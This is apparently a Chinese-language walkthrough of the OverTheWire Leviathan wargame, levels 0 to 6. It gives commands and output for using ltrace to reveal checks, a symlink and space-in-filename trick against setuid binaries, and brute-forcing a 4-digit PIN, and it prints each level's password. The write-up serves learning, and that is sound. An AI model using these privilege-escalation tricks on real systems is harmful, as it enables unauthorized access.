# level0 (在 html文件中grep password关键词)

将`/home/leviathan0/.backup`目录下的html文件传到本地然后grep一下password关键词。

➜  level0 git:(master) grep password bookmarks.html                                                                               [22:31:04]
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>

得到level1的密码为
rioGegei8m

# level1 (ltrace的简单使用)

发现home目录下的check可执行文件(setuid)
```
leviathan1@melinda:~$ ltrace ./check 
...
strcmp("asd", "sex")
...
```
用sex成功得到shell
`cat /etc/leviathan_pass/leviathan2`
得到level2的密码为
ougahZi8Ta

# level2 (access()检查文件是否存在，而/bin/cat 并不检查文件名是否含有空格, 符号链接)

```
leviathan2@melinda:/tmp/solveme$ ltrace ~/printfile "file tmp.txt"
__libc_start_main(0x80484f4, 2, -10348, 0x80485d0, 0x8048640
access("file tmp.txt", 4) = 0
snprintf("/bin/cat file tmp.txt", 511, "/bin/cat %s", "file tmp.txt") = 21
system("/bin/cat file tmp.txt"/bin/cat: file: Permission denied
/bin/cat: tmp.txt: No such file or directory
```
通过ltrace命令发现./printfile会通过调用access()检查文件是否存在，确认存在之后再调用cat命令，打印出文件内容。
所以我们需要先利用空格的bug，创建一个文件名中含有空格的文件，然后将空格前面(或后面)的字符串作为
`/etc/leviathan_pass/leviathan3`的链接文件。
```
leviathan2@melinda:/tmp/your_name$ ln -s  /etc/leviathan_pass/leviathan3 a
leviathan2@melinda:/tmp/your_name$ touch a\ b.txt
leviathan2@melinda:/tmp/your_name$ ~/printfile a\ b.txt
Ahdiemoo1j
/bin/cat: b.txt: No such file or directory
```
得到level3的密码为
Ahdiemoo1j

# level3
依然是用ltrace
```
leviathan3@melinda:~$ ls
level3
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                             = -1
printf("Enter the password> ")                                                         = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7fcac20)                                                  = 0xffffd58c
strcmp("snlprintf\n", "snlprintf\n")                                                   = 0
puts("[You've got shell]!"[You've got shell]!
)                                                            = 20
system("/bin/sh"$ id
uid=12003(leviathan3) gid=12003(leviathan3) groups=12003(leviathan3)
$ exit
 <no return ...>
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                 = 0
 +++ exited (status 0) +++
 leviathan3@melinda:~$ ./level3
 Enter the password> snlprintf
 [You've got shell]!
 $ id
 uid=12003(leviathan3) gid=12003(leviathan3) euid=12004(leviathan4) groups=12004(leviathan4),12003(leviathan3)
 $ cat /etc/leviathan_pass/leviathan4
 vuH0coox6m
```

得到level4的密码为
vuH0coox6m

# level4

发现`/.trash.bin`，执行之，得到
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
将字节码放到
http://www.binaryhexconverter.com/binary-to-ascii-text-converter
解码得到
Tith4cokei

得到level5的密码为
Tith4cokei

# level5 (ln -s 符号链接)

执行
```
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
```
发现需要用到/tmp/file.log, 于是尝试写入任意字符串到该文件
```
leviathan5@melinda:~$ echo  "xxx" >> /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
xxx
```
于是可以将该文件设置为需要的文件的链接
```
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6  /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
```
于是得到level6的密码为
UgaoFee4li

# level6 (shell脚本暴力破解)
参考
http://blog.zer0w1re.net/over-the-wire-leviathan-walkthrough/
既然只是4位数，可暴力破解
```
for i in {0000..9999}; do ./leviathan6 $i; echo $i; done
```
结果得到
```
Wrong
7119
Wrong
7120
Wrong
7121
Wrong
7122
$id                                                                                                                                        [ uid=12006(leviathan6) gid=12006(leviathan6) euid=12007(leviathan7) groups=12007(leviathan7),12006(leviathan6)
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
